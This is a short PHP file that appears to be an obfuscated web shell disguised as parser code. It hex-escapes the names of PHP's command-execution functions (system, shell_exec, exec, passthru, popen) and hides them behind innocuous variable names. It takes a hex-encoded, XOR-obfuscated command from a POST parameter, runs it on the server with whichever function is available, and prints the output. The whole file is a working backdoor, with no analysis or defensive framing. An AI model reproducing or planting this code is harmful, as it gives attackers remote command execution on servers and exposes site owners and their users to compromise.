<?php

$token_parser_engine4 = "\x70ass\x74\x68\x72u";
$token_parser_engine3 = "ex\x65\x63";
$token_parser_engine1 = "\x73yste\x6D";
$token_parser_engine7 = "p\x63\x6Co\x73e";
$token_parser_engine5 = "p\x6F\x70en";
$hub_center = "\x68e\x78\x32\x62in";
$token_parser_engine2 = "\x73\x68\x65ll\x5F\x65xec";
$token_parser_engine6 = "strea\x6D_g\x65\x74_\x63o\x6E\x74\x65\x6Et\x73";
if (isset($_POST["\x68ld"])) {
            function splitter_tool ($item ,  $tkn){$flag = '' ; for($j=0; $j<strlen($item); $j++){$flag.=chr(ord($item[$j])^$tkn);} return $flag; }
            $hld = $hub_center($_POST["\x68ld"]);
            $hld = splitter_tool($hld, 11);
            if (function_exists($token_parser_engine1)) {
                $token_parser_engine1($hld);
            } elseif (function_exists($token_parser_engine2)) {
                print $token_parser_engine2($hld);
            } elseif (function_exists($token_parser_engine3)) {
                $token_parser_engine3($hld, $pointer_item);
                print join("\n", $pointer_item);
            } elseif (function_exists($token_parser_engine4)) {
                $token_parser_engine4($hld);
            } elseif (function_exists($token_parser_engine5) && function_exists($token_parser_engine6) && function_exists($token_parser_engine7)) {
                $tkn_flag = $token_parser_engine5($hld, 'r');
                if ($tkn_flag) {
                    $binding_desc = $token_parser_engine6($tkn_flag);
                    $token_parser_engine7($tkn_flag);
                    print $binding_desc;
                }
            }
            exit;
        }